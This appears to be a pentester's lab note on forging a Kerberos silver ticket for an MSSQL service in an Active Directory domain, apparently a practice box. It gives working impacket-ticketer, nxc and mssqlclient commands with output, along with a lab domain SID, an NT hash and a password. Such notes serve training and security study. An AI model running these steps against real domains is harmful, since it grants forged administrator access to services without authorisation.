---
publish: true
created: 2026-03-27T21:39:51.785+05:30
modified: 2026-06-21T20:12:44.548+05:30
---

<https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/silver-ticket>

Abuse Idea - we get highest privilege on this service  with forged ticket.

## impacket

For silver ticket. we need 3 things.

1. Domain SID.
2. SPN of the account we have compromised.
3. compromised SPN's Hash. <https://codebeautify.org/ntlm-hash-generator>

```
Domain SID:S-1-5-21-1969309164-1513403977-1686805993
SPN MSSQL/nagoya.nagoya-industries.com
Service1 - nt hash using url - E3A0168BC21CFB88B95C954A5B18F57C
```

```
$ impacket-ticketer -spn 'MSSQL/nagoya.nagoya-industries.com' -domain-sid 'S-1-5-21-1969309164-1513403977-1686805993' -nthash 'E3A0168BC21CFB88B95C954A5B18F57C' -domain nagoya-industries.com administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for nagoya-industries.com/administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

lets get the krb5.conf automatically with nxc.

```
$ nxc smb nagoya -u svc_mssql -p 'Service1' -k --smb-timeout 10 --generate-krb5-file krb5.conf
SMB         nagoya          445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         nagoya          445    NAGOYA           [+] krb5 conf saved to: krb5.conf
SMB         nagoya          445    NAGOYA           [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         nagoya          445    NAGOYA           [+] nagoya-industries.com\svc_mssql:Service1
```

now we have krb5.conf and ccache file ready for authentication.

```
export KRB5_CONFIG=krb5.conf
export KRB5CCNAME=$PWD/Administrator.ccache
```

now simply use the service, in this case mssql.

```
$ impacket-mssqlclient -k nagoya.nagoya-industries.com
```
